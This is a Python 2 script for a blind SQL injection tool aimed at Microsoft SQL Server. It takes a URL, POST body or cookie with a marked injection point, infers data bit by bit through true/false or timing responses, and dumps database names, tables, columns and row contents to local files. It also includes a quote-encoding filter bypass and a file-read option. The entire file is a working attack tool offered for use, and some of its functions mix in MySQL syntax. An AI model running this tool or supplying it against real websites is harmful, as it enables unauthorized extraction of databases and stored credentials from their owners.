#!/usr/bin/env python

import urllib2
import urllib
import string
import re
import os
import sys
import math
import time
import md5
from threading import Thread
from Queue import Queue
from optparse import OptionParser

class MssqlTrueFalse:
	def withoutQuotes(self,chaine):
		return 'concat(%s)' % ','.join(['char(0x%x)' % ord(i) for i in chaine[1:-1]])

	def tricks(self,sqli):
		if self.modif == "1":
			while re.search("'",sqli):
				string = re.search("('.+?')",sqli).group(0)
				sqli = re.sub(string,self.withoutQuotes(string),sqli)

		return sqli

	def __init__(self, url, post, cookie,verbose=False,error="",modification="0", output_dir="my_dump", bug=""):
		self.target = 0
		self.bug=bug
		self.limit=1
		self.stat=0
		self.modif = modification
		if not re.match("http",url):
			print "-u http<url>"
			sys.exit();
		if output_dir=="my_dump":
			output_dir = re.findall("https?://([^/]*).*",url)[0]

		self.url = re.sub("1=([^1]*)1","1=1 W00T",url)
		self.post = re.sub("1=([^1]*)1","1=1 W00T",post)
		self.cookie = re.sub("1=([^1]*)1","1=1 W00T",cookie)

		if re.search("1=([^1]*)1",self.url):
			self.target = 1
			self.inject = self.url
			self.speChar = re.findall("1=([^1]*)1",url)[0]
		elif re.search("1=([^1]*)1",self.post):
			self.target = 2
			self.inject = self.post
			self.speChar = re.findall("1=([^1]*)1",post)[0]
		elif re.search("1=([^1]*)1",self.cookie):
			self.target = 3
			self.inject = self.cookie
			self.speChar = re.findall("1=([^1]*)1",cookie)[0]

		if self.target == 0:
			print "type 1=1 where to inject"
			sys.exit();

		self.verbose = verbose
		self.error = error

		if not os.path.isdir("dump/" + output_dir):
			ok = self.testInjection()
			if not ok:
				sys.exit()
			else:
				os.mkdir("dump/" + output_dir)
		ok = self.testInjection()
		self.output_dir = output_dir

	def testInjection(self):
		self.valide = self.doRequest()['text']
		if self.error=="":
			valide2 = self.doRequest()['text']
			if self.valide != valide2:
				print "Hard to deteremine the good page"
				print "Try to add error option to help (option --Error)"
				return False
			print "Found valid page... You can add error option to improve (option --Error)"

		self.changeInject("1=2")

		if self.testTrueFalse():
			print "Bad injection ?"
			return False
		print "Injection seems good, let's check if DB_NAME() exist..."

		string = self.tricks("(select count(DB_NAME())) = 1")
		self.changeInject(string)

		if not(self.testTrueFalse()):
			print "DB_NAME() not found, sorry I can't do anything more."
			return False
		print "Everything seems good. Dump can begin."
		return True

	def changeInject(self,new):
		self.inject = re.sub("1=1",new,self.inject)

	def value(self, request, colonne, num = 1, size=0):

		if size==0:
			size=self.length(request, colonne, num)
			if size==0:
				print "%s return a length of 0... It may not exist"% request
				sys.exit()
			print "%d long" %size
		val=""
		for i in range(size):
			z=0
			q=Queue()
			t=[]
			# for j in range(8):
			# 	if self.limit==1:
			# 		t.append(Thread(target=self.bitGuessing, args=("ascii(substring((select top 1 " + colonne + " from (select top " + str(num) + " " + colonne + " from (" + request + ") aq order by " + colonne + " asc) dq order by " + colonne + " desc), " + str(i+1) + ", 1))",j,q)))
			# 	else:
			# 		t.append(Thread(target=self.bitGuessing, args=("ascii(substring((" + request + "), " + str(i+1) + ", 1))",j,q)))
			# 	t[j].start()
			for j in range(8):
				# t[j].join()
				if self.limit==1:
					z+=self.bitGuessing2("ascii(substring((select top 1 " + colonne + " from (select top " + str(num) + " " + colonne + " from (" + request + ") aq order by " + colonne + " asc) dq order by " + colonne + " desc), " + str(i+1) + ", 1))",j)
				else:
					z+=self.bitGuessing2("ascii(substring((" + request + "), " + str(i+1) + ", 1))",j)
			# 	t[j].start()
			val+=chr(z)
			print val
		return val

	def length(self, request, colonne, num = 1):
		if self.limit==1:
			return self.count("select len((select top 1 " + colonne + " from (select top " + str(num) + " " + colonne + " from (" + request + ") aq order by " + colonne + " asc) dq order by " + colonne + " desc))",0,20)
		else:
			return self.count("select len((" + request + "))",0,20)

	def bitGuessing(self, request, bit, queue):
		string = self.tricks("(cast(cast(" + request + " %26 " + str(pow(2,bit)) + " as bit) as CHAR(1))) = 1")
		self.changeInject(string)
		if self.testTrueFalse():
			queue.put(1<<bit)
		else:
			queue.put(0)

	def bitGuessing2(self, request, bit):
		string = self.tricks("(cast(cast(" + request + " %26 " + str(pow(2,bit)) + " as bit) as CHAR(1))) = 1")
		self.changeInject(string)
		if self.testTrueFalse():
			return (1<<bit)
		else:
			return (0)


	def count(self, request, begin = 1, end = 100):
		a=0
		min=begin
		max=end
		nombre=self.dicho(min,max)
		while a==0:
			string = self.tricks("(" + request + ") < " + str(nombre))
			self.changeInject(string)
			if self.testTrueFalse():
				max=nombre
			else:
				min=nombre
			nombre=self.dicho(min,max)
			if (max-min)<2:
				string = self.tricks("(" + request + ") = " + str(min))
				self.changeInject(string)
				if self.testTrueFalse():
					nombre=min
					a=1
				else:
					string = self.tricks("(" + request + ") = " + str(max))
					self.changeInject(string)
					if self.testTrueFalse():
						nombre=max
						a=1
					else:
						print "Try more than %d"%max
						max+=end
						nombre = self.dicho(min,max)
		return nombre

	def dicho(self,min,max):
		return int(math.ceil(min+((max-min)/2)))

	def testTrueFalse(self):
		res=self.doRequest()
		if self.bug != "":
			if re.search(self.bug,res):
				print "Error in injection"
				sys.exit()

		if self.error == "":
			if res == self.valide:
				return True
			else:
				return False
		elif self.error == "time":
			if self.verbose:
				print res['time']+' seconds'
			if res['time'] >= 4:
				return True
			else:
				return False
		else:
			if re.search(self.error,res):
				return False
			else:
				return True

	def doRequest(self):
		time.sleep(1)
		if self.target == 1:
			if re.search("W00T", self.inject):
				url=re.sub("W00T","and 1=" + str(self.speChar) + "1",self.inject)
				post=self.post
				cookie=self.cookie
				self.inject = self.url
		elif self.target == 2:
			if re.search("W00T", self.inject):
				url=self.url
				post=re.sub("W00T","and 1=" + str(self.speChar) + "1",self.inject)
				cookie=self.cookie
				self.inject = self.post
		elif self.target == 3:
			if re.search("W00T", self.inject):
				url=self.url
				post=self.post
				cookie=re.sub("W00T","and 1=" + str(self.speChar) + "1",self.inject)
				self.inject = self.cookie
		if self.verbose:
			print "Url : "+url
			print "Post : "+post
			print "Cookie : "+cookie

		request=urllib2.Request(url.replace(" ", "%20"))
		request.add_header("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) Gecko/20061010 Firefox/2.0")
		request.add_header("Cookie",cookie.replace(" ", "%20"))
		if post:
			request.add_data(post)
			#request.add_data(post)
		a = time.time()
		
		page = urllib2.urlopen(request)
		result = page.read()
		if self.verbose:
			print "Page length : %d"%len(result)
		
		b = time.time()
		result = {'text': result, 'time': b-a}
		self.stat+=1
		return result

	def conditionRequest(self,request,condition):
		if condition!="":
			if re.search("where",request):
				return request+" and "+condition
			else:
				return request+" where "+condition
		else:
			return request

	def restore(self, request, r_begin, end):
		m = md5.new()
		m.update(request)
		self.md5_req = m.hexdigest()

		if os.path.isfile("dump/" + myInjector.output_dir + "/state_"+self.md5_req):
			f=open("dump/" + myInjector.output_dir + "/state_"+self.md5_req,"r")
			s_begin, s_end = f.read().split(":")
			f.close()
			begin=int(s_begin,10)
			end=int(s_end,10)
		else:
			begin=r_begin

		if r_begin!=1:
			begin=r_begin

		return [begin, end]

	def dump(self, request, colonne, begin, end):
		dump=[]

		f = open("dump/" + self.output_dir + "/dumped_"+self.md5_req,"a+")
		f.write(request+"\n")
		f.close()
		f = open("dump/" + self.output_dir + "/index","a+")
		f.write(self.md5_req+" : "+request+"\n")
		f.close()

		for i in range(begin,end+1):
			f=open("dump/" + self.output_dir + "/state_"+self.md5_req,"w")
			f.write(str(i)+":"+str(end))
			f.close()
			entrie = self.value(request,colonne, i)
			f=open("dump/" + self.output_dir + "/dumped_"+self.md5_req,"a+")
			f.write("line " + str(i) + " : "+entrie+"\n")
			f.close()
			dump.append(entrie)
		return dump

	def dumpFile(self, file, begin = 1, end = 0):
		self.limit=0
		self.changeInject(self.tricks("!isnull(load_file('%s'))"%file))
		if not(self.testTrueFalse()):
			print "%s doesn't exist."%file
			sys.exit(0)
		request=self.conditionRequest("load_file('%s')"%file,'')
		end=1
		return self.dump(request,"",begin,end)

	def dumpSpecial(self, function, begin = 1, end = 0):
		self.limit=0
		request=self.conditionRequest(function,'')
		begin, end = self.restore(request,begin,end)
		end=2
		return self.dump(request,"",begin,end)

	def countDB(self,condition=""):
		request=self.conditionRequest("select count(distinct(name)) from master..sysdatabases",condition)
		return self.count(request)

	def dumpDB(self, begin = 1, end = 0, condition=""):
		request=self.conditionRequest("select distinct(name) from master..sysdatabases",condition)
		begin, end = self.restore(request,begin,end)
		if end==0:
			end=self.countDB(condition)
		print "There is %d databases with condition : %s"%(end,condition)
		return self.dump(request, "name", begin,end)

	def countTables(self,database,condition=""):
		request=self.conditionRequest("select count(distinct(sysobjects.name)) from " + database + "..sysobjects join "+ database + "..syscolumns on sysobjects.id = syscolumns.id where sysobjects.xtype = char(0x55)",condition)
		return self.count(request)

	def dumpTables(self, database, begin = 1, end = 0, condition=""):
		request=self.conditionRequest("select distinct(sysobjects.name) from " + database + "..sysobjects join "+ database + "..syscolumns on sysobjects.id = syscolumns.id where sysobjects.xtype = char(0x55)",condition)
		begin, end = self.restore(request,begin,end)
		if end==0:
			end=self.countTables(database, condition)
		print "There is %d tables in %s with condition : %s"%(end,database,condition)
		return self.dump(request, "name", begin,end)

	def countColumns(self,database,table,condition=""):
		#request=self.conditionRequest("select count(distinct(master..syscolumns.name)) as cname from master..syscolumns, master..sysobjects where master..syscolumns.id=master..sysobjects.id and master..sysobjects.name='" + table + "'",condition)
		request=self.conditionRequest("select count(distinct(name)) from " + database + "..syscolumns where id = (select id from "+database+"..sysobjects where name = '"+ table +"')",condition)
		return self.count(request)

	def dumpColumns(self, database, table, begin = 1, end = 0, condition=""):
		#request=self.conditionRequest("select distinct(master..syscolumns.name) as cname from master..syscolumns, master..sysobjects where master..syscolumns.id=master..sysobjects.id and master..sysobjects.name='" + table + "'",condition)
		request=self.conditionRequest("select distinct(name) from " + database + "..syscolumns where id = (select id from " + database + "..sysobjects where name = '"+ table +"')",condition)
		begin, end = self.restore(request,begin,end)
		if end==0:
			end=self.countColumns(database, table, condition)
		print "There is %d columns in %s.%s with condition : %s"%(end,database,table,condition)
		return self.dump(request,"name",begin,end)

	def countEntries(self, database, table, column, condition=""):
		request=self.conditionRequest("select count(distinct("+column+")) from "+database+".."+table,condition)
		return self.count(request)

	def dumpEntries(self, database, table, column, begin = 1, end = 0, condition=""):
		request=self.conditionRequest("select distinct("+column+") as name from "+database+".."+table,condition)
		begin, end = self.restore(request,begin,end)
		if end==0:
			end=self.countEntries(database, table, column, condition)
		print "There is %d entries in %s.%s, column %s with condition : %s"%(end,database,table,column,condition)
		return self.dump(request,"name",begin,end)

	def getStat(self):
		return self.stat


if __name__ == "__main__":
	parser = OptionParser()
	parser.add_option("-u", "--url", action="store", type="string", dest="url", default="", help="url where sql injection was found with 1=.?1 where injection is")
	parser.add_option("-d", "--database",	action="store", type="string", dest="database",default="", help="Dump table from database")
	parser.add_option("-t", "--table",	action="store", type="string", dest="table",default="",	help="Dump colonne from table and database")
	parser.add_option("-c", "--colonne", action="store", type="string", dest="colonne",default="", help="Dump result from column, table and database")
	parser.add_option("-f", "--file", action="store", type="string", dest="file",default="", help="Try to dump load_file()")
	parser.add_option("-S", "--Special", action="store", type="string", dest="special",default="", help="dump special function (@@version...)")
	parser.add_option("-p", "--post",	action="store", type="string", dest="post",default="", help="Add post data with 1=.?1 where injection is")
	parser.add_option("-s", "--session", action="store", type="string", dest="cookie",default="", help="Add cookie data with 1=.?1 where injection is")
	parser.add_option("-E", "--Error", action="store", type="string", dest="error",default="",	help="If hard to determine good page, give some strings in 1=2 page")
	parser.add_option("-v", "--verbose", action="store_true", dest="verbose",default=False, help="Print url request")
	parser.add_option("-b", "--begin", action="store", type="string", dest="begin",default="1",	help="Start dumping with the <begin> line")
	parser.add_option("-e", "--end", action="store", type="string", dest="end",default="0", help="Finish dumping with the <end> line")
	parser.add_option("-C", "--Condition", action="store", type="string", dest="condition",default="", help="Specify condition ex : -C 'login=admin'")
	parser.add_option("-m", "--Modif", action="store", type="string", dest="modification",default="0", help="Specify tricks to bypass filter (type -m list to list the tricks)")
	parser.add_option("-w", "--write", action="store", type="string", dest="output_dir",default="my_dump", help="Directory to save the dump")
	parser.add_option("-B", "--bug", action="store", type="string", dest="bug",default="", help="A string that mean request bugged")

	(options, args) = parser.parse_args()
	if options.modification == "list":
		print "-m 1 : transform strings with quotes to char(0x) concat"
		sys.exit()
	a = int(time.time())
	myInjector = MssqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification, options.output_dir, options.bug)

	begin = int(options.begin,10)
	end = int(options.end,10)

	if options.file!="":
		myInjector.dumpFile(options.file, begin, end)
	elif options.special!="":
		myInjector.dumpSpecial(options.special, begin, end)
	else:
		if options.database=="":
			print myInjector.dumpDB(begin, end, options.condition)
		elif options.table=="":
			print myInjector.dumpTables(options.database, begin, end, options.condition)
		elif options.colonne=="":
			print myInjector.dumpColumns(options.database,options.table, begin, end, options.condition)
		else:
			print myInjector.dumpEntries(options.database,options.table,options.colonne, begin, end, options.condition)

	b = int(time.time())
	print "Done in %d request and %d seconds" %(myInjector.getStat(),(b-a))